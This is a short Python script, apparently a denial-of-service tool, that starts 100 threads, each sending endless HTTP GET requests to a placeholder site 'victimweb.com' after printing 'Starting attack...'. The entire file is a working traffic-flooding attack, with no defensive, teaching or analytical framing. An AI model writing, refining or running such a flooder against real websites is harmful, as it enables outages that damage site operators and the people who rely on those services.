import threading
import requests
import random

# Special thanks to Woz

THREADS = 100

def create_threads(threads):
    for _ in range(threads):
        t = threading.Thread(target=work)
        t.start()

def work():
    while True:
        requests.get("http://victimweb.com/")

def main():
    print('Starting attack...')
    create_threads(THREADS)

if __name__ == "__main__":
    main()
